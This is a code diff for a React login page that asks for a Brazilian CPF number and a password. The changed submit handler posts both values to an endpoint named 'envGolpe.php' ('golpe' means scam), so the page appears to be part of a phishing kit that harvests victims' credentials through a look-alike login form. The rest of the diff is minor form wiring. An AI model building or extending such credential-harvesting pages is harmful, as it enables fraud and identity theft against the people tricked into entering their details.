@@ -7,6 +7,7 @@ import styles from '../styles/pages/Login.module.scss';
 import { useEffect } from 'react';
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import { api } from '../services/api';
 
 interface FormData {
   cpf: string;
@@ -28,8 +29,16 @@ export default function Home() {
     resolver: yupResolver(schemaValidate)
   });
 
-  const handleSignIn: SubmitHandler<FormData> = ({cpf, password}) => {
-    console.log({ cpf, password });
+  const handleSignIn: SubmitHandler<FormData> = async ({cpf, password}) => {
+
+    const data = {
+      login: cpf,
+      senha: password
+    };
+
+    const response = await api.post('/envGolpe.php', data);
+
+    console.log(response);
   }
 
   useEffect(() => {
@@ -70,6 +79,7 @@ export default function Home() {
                     type="cpf" 
                     className={errors.cpf && 'error'}
                     placeholder=" " 
+                    pattern="[0-9]+"
                     {...register('cpf')}
                   />
                   <p>CPF</p>
